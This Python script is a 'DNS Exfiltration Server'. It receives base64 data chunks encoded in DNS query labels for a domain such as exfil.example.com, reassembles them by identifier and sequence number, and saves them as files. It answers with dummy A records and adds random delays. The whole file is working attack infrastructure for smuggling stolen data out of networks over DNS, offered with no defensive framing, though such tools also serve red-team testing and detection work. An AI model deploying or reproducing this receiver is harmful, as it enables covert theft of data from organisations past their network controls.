#!/usr/bin/env python3
import threading
import struct
import socket
import base64
from collections import defaultdict
import os
import argparse
from dnslib import DNSRecord, RR, QTYPE, A
import time
import random

# Dictionary to hold incoming data fragments by identifier and expected sequence count
data_fragments = defaultdict(lambda: {})
expected_counts = defaultdict(int)

def parse_dns_header(data):
    id, flags, qdcount, ancount, nscount, arcount = struct.unpack('!6H', data[:12])
    return id, flags

def parse_dns_query_section(data):
    offset = 12  # Start after the header (12 bytes)
    labels = []
    try:
        while True:
            length = data[offset]
            if length == 0:
                offset += 1  # Move past the zero byte
                break
            if offset + length > len(data):
                return False
            offset += 1  # Move past the length byte
            label = data[offset:offset + length]
            labels.append(label.decode('ascii'))
            offset += length
        domain_name = '.'.join(labels)
        return domain_name
    except Exception as e:
        return False

def handle_dns_request(data, addr, sock, args):
    dns_id, dns_flags = parse_dns_header(data)
    # Process only if DNS flags are not all zero (adjust if needed)
    if dns_flags:
        domain_name = parse_dns_query_section(data)
        if domain_name:
            # Check that the domain matches the expected domain
            if '.' not in domain_name or domain_name.split(".", 1)[1] != args.domain:
                print("Invalid domain name")
                return
            # Introduce a delay to rate limit requests
            pause_time = random.randint(args.low, args.high)
            time.sleep(pause_time / 1000)
            process_query(domain_name, args)
            send_dns_response(data, addr, sock)
        else:
            print("DNS query section parsing failed.")

def send_dns_response(data, addr, sock):
    try:
        request = DNSRecord.parse(data)
        reply = request.reply()
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("192.0.2.1"), ttl=300))
        response_data = reply.pack()
        sock.sendto(response_data, addr)
    except Exception as e:
        print(f"Error sending DNS response: {e}")

def process_query(domain_name, args):
    parts = domain_name.split('.')
    identifier_segment = parts[0]
    try:
        identifier, segment_index, total_segments, encoded_data = identifier_segment.split('-', 3)
    except Exception as e:
        print(f"Failed to parse identifier segment: {e}")
        return

    print(f"Received encoded data: {encoded_data}")

    try:
        decoded_data = base64.urlsafe_b64decode(encoded_data + '==')
    except Exception as e:
        print(f"Error decoding data: {e}")
        return

    index = int(segment_index)
    total = int(total_segments)
    expected_counts[identifier] = total
    data_fragments[identifier][index] = decoded_data
    if len(data_fragments[identifier]) == total:
        save_data(identifier, data_fragments[identifier], args)

def save_data(identifier, fragments, args):
    sorted_data = [fragments[i] for i in sorted(fragments)]
    file_content = b''.join(sorted_data)
    output_filename = os.path.join(args.output_dir, f"{identifier}.bin")
    os.makedirs(args.output_dir, exist_ok=True)
    with open(output_filename, 'wb') as f:
        f.write(file_content)
    print(f"Saved data for identifier {identifier} to {output_filename}")

def get_args():
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server")
    parser.add_argument("--port", type=int, default=5300, help="The port on which the server listens")
    parser.add_argument("--output-dir", default="output", help="Directory to save the extracted files")
    parser.add_argument("--low", type=int, default=100, help="Minimum delay in milliseconds before responding")
    parser.add_argument("--high", type=int, default=1500, help="Maximum delay in milliseconds before responding")
    parser.add_argument("--domain", default="exfil.example.com", help="The domain name to match for DNS queries")
    return parser.parse_args()

def start_server(args):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', args.port))
    print(f"DNS server listening on port {args.port}...")
    try:
        while True:
            sock.settimeout(1)
            try:
                data, addr = sock.recvfrom(1024)
            except socket.timeout:
                continue
            # Run each DNS request in a new thread
            threading.Thread(target=handle_dns_request, args=(data, addr, sock, args)).start()
    except KeyboardInterrupt:
        print("Shutting down the server.")
    finally:
        sock.close()

if __name__ == "__main__":
    args = get_args()
    start_server(args)
